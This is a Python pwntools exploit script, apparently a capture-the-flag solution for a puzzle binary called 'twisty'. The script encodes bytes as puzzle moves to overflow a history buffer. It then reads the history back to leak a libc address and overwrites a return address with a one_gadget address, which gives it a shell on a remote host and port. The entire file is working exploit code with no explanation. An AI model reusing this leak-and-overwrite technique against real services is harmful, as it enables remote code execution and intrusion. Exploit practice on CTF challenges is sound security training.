#!/usr/bin/env python
from pwn import *

def num2command(num):
    if num & 8 != 0:
        x = 'r'
        if num & 4 != 0:
            y = 'l'
        else:
            y = 'r'
    else:
        x = 'c'
        if num & 4 != 0:
            y = 'd'
        else:
            y = 'u'
    index = chr((num & 3) + 0x30)
    return x + index + y

command2num = {}
for i in range(0x10):
    command2num[num2command(i)] = i

def bytes2commands(x):
    commands = []
    for c in x:
        y = ord(c)
        commands.append(num2command(y >> 4))
        commands.append(num2command(y & 0xf))
    return commands

def sendcommands(payload):
    commands = bytes2commands(payload)
    for c in commands:
        s.sendline(c)
    for _ in commands:
        s.recvuntil('> ')

def history():
    s.sendlineafter('> ', 'l')
    nums = []
    for i, c in enumerate(s.recvline(False).split(' ')[:-1]):
        num = command2num[c]
        if i & 1 == 0:
            nums.append(num << 4)
        else:
            nums[-1] += num
    return ''.join(map(chr, nums))

def undo():
    s.sendlineafter('> ', 'u')

if len(sys.argv) == 1:
    s = process('./twisty')
else:
    s = remote('138.68.67.161', 20007)

sendcommands('A' * 0x800)
s.sendlineafter('> ', num2command(11))
undo()
res = history()
libc_base = u64(res[-8:]) - 0x20830
log.info('libc base: %#x' % libc_base)

for i in range(0x10):
    undo()
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
sendcommands(p64(libc_base + one_gadgets[0]))

# Solve the puzzle by hand
s.interactive()
